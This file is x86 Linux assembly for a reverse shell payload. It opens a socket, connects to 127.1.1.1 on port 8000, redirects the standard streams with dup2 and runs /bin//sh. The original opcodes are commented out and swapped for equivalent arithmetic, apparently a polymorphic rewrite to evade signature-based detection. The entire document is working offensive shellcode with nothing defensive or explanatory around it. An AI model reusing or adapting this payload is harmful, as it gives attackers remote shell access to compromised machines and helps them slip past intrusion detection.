
global _start			

section .text
_start:

 	;push   0x66
	;pop    eax
	xor    eax, eax
	mov    al, 0x77
	sub    al, 0x11
	;push   0x1
	;pop    ebx
	xor    ebx, ebx
	mov    bl, 0x2
	sub    bl, 0x1
	xor    edx,edx
	push   edx
	push   ebx
	push   0x2
	mov    ecx,esp
	int    0x80
	xchg   edx,eax
	;mov    al,0x66
	mov    al,0x22
	add    al,0x44
	push   0x101017f 
	push word  0x401f
	inc    ebx
	push   bx
	mov    ecx,esp
	push   0x10
	push   ecx
	push   edx
	mov    ecx,esp
	;inc    ebx
	add    ebx, 1
	int    0x80
	push   0x2
	pop    ecx 
	xchg   edx,ebx
loop:
	;mov    al,0x3f
	mov    al, 0x2e
	add    al, 0x11
	int    0x80
	;dec    ecx
	sub    ecx, 1
	jns    loop
	mov    al,0xb
	;inc    ecx
	add    ecx, 1
	mov    edx,ecx
	push   edx
	push   0x68732f2f	
	push   0x6e69622f
	mov    ebx,esp
	int    0x80

